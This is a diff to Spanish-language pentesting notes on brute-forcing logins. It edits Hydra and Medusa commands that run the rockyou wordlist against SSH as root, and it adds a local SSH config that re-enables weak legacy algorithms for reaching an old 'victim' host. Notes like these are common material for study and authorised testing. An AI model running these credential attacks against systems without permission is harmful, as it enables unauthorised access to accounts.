@@ -93,7 +93,7 @@ Tags: #Hydra #Medusa #BruteForce #Spraying #Credenciales #Autenticacion
 
 ### SSH (Puerto 22)
 ```bash
-❯ hydra -l root -P /usr/share/wordlists/rockyou.txt <IP> ssh -t 4
+❯ hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://<IP>
 # Usuario root | -t 4 → SSH suele tener protección anti-brute
 
 ❯ hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://<IP> -t 4 -V
@@ -111,6 +111,20 @@ Tags: #Hydra #Medusa #BruteForce #Spraying #Credenciales #Autenticacion
 ❯ medusa -h <IP> -U users.txt -P /usr/share/wordlists/rockyou.txt -M ssh -t 4
 # Alternativa con medusa
 ```
+
+### Alternativa si SSH es muy antiguo en la víctima 
+```python 
+# Configurar SSH localmente (Kali)
+cat > ~/.ssh/config << 'EOF'
+Host 192.168.208.39
+    HostKeyAlgorithms ssh-rsa
+    KexAlgorithms diffie-hellman-group1-sha1
+    MACs hmac-sha1,hmac-md5
+EOF
+
+❯ chmod 600 ~/.ssh/config
+```
+
 
 ### Telnet (Puerto 23)
 ```bash
